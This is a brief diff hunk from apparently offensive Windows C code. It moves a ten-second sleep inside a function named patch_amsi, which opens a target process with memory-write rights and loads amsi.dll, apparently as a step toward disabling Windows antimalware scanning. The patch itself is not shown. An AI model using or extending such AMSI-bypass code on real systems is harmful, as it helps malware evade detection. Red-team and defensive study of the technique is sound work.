@@ -59,13 +59,12 @@ char* get_env(const char* name) {
 
 
 bool patch_amsi(PROCESS_INFORMATION pi) {
+    Sleep(10000);
     HANDLE hProcess = OpenProcess(
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
         FALSE, 
         (DWORD)pi.dwProcessId
     );
-
-    Sleep(10000);
     HMODULE ams_dll = LoadLibraryW(L"amsi.dll");
     bool success = false;
     if (ams_dll != NULL) {
